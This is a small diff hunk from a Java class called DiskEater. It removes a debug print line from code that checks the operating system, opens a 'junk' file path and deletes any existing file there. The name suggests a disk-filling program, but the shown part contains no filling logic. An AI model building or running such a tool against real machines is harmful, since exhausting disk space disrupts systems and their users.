@@ -34,7 +34,6 @@ public class DiskEater {
         if (getJunkPath().equals("junk")) {
             System.out.println("Operating System not supported.");
         } else {
-            System.out.println("\\");
             File file = new File(getJunkPath());
 
             // remove file if it already exists
